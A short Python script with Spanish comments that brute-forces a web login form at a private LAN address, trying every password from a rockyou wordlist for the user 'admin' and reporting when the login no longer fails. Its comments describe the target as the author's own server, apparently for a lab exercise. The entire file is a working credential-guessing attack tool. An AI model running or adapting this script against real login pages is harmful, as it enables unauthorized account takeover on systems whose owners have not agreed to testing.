import requests
import os
from dotenv import load_dotenv



# Con este fichero hacemos un ataque de fuerza bruta hacia nuestro servidor web


load_dotenv()
url = "http://192.168.1.222/index.php"
username = "admin"
password_file = os.getenv('ROCKYOU_PATH')

print(f"[*] Iniciando ataque de fuerza bruta sobre {url}...")

with open(password_file, "r") as f:
    for line in f:
        # Las credenciales de nuestro fichero han de estar cada una en una linea separada para que funcione correctamente
        password = line.strip()
        # Preparamos los datos para enviar al formulario de inicio de sesion
        data = {
            "username": username,
            "password": password
        }
        
        try:
            # Manejamos la respuesta del servidor
            response = requests.post(url, data=data)
            
            # Si no hay mensaje de error en la respuesta, es que hemos dado con las credenciales
            if "Inicio de sesión fallido" not in response.text:
                print(f"[+] ¡ÉXITO! Contraseña encontrada: {password}")
                break
            else:
                print(f"[-] Fallo: {password}")
                
        except Exception as e:
            print(f"[!] Error de conexión: {e}")

print("[*] Ataque finalizado.")